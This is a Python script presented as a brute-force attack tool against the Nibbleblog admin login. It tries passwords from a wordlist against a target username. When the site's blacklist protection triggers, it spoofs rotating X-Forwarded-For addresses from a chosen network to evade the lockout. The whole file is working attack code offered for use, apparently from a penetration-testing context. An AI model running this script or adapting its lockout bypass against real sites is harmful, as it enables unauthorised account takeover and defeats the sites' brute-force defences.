#!/usr/bin/env python3
import requests
from sys import argv
from netaddr import IPNetwork
from argparse import ArgumentParser

def bruteForce(ip_address, username, password, url):
    login_failed = "Incorrect username or password."
    blacklist_message = "Nibbleblog security error - Blacklist protection"
    headers = {
        "X-Forwarded-For": network[ip]
    }
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(url=url, data=data, headers=headers)
    if login_failed in response.text:
        print(f"[-] Login Failed => {username}:{password}")
        return "failed"
        
    elif blacklist_message in response.text:
        print(f"[!] Blacklisted - Bypassing Blacklist via X-Forwarded-For HTTP Header and IP {network[ip]}")
        return "blacklist"
    else:
        return f"[+] Valid Credentials Found => {username}:{password}"

parser = ArgumentParser(description="Simple NibbleBlog Brute Force Attack Tool")
parser.add_argument("--username", action="store", dest="username", help="This option is to specify the target username")
parser.add_argument("--wordlist", action="store", dest="wordlist", help="This option is to specify the path to the passwords wordlist")
parser.add_argument("--network", action="store", dest="network", default="192.168.0.0/16", help="This option is to specify the network (EX: 192.168.1.0/24) to spoof the source IP addresses")
parser.add_argument("--url", action="store", dest="url", help="This option is to specify the target URL with the admin.php uncluded")
given_args = parser.parse_args()

if len(argv) == 1:
    parser.print_help()
    exit()

ip = 0
network = list(str(ip) for ip in IPNetwork(given_args.network))
wordlist = (password.replace("\n", "") for password in open(given_args.wordlist).readlines())

for password in wordlist:
    response = bruteForce(ip_address=network[ip], username=given_args.username, password=password, url=given_args.url)
    if response == "failed":
        continue
    elif response == "blacklist":
        try:
            ip += 1
            response = bruteForce(ip_address=network[ip], username=given_args.username, password=password, url=given_args.url)
        except IndexError:
            print("Insuficient IP Addresses in the specified network to spoof")
            exit()
        if response == "failed":
            continue
        elif response == "blacklist":
            continue
        else:
            print(response)
            exit()
    else:
        print(response)
        break
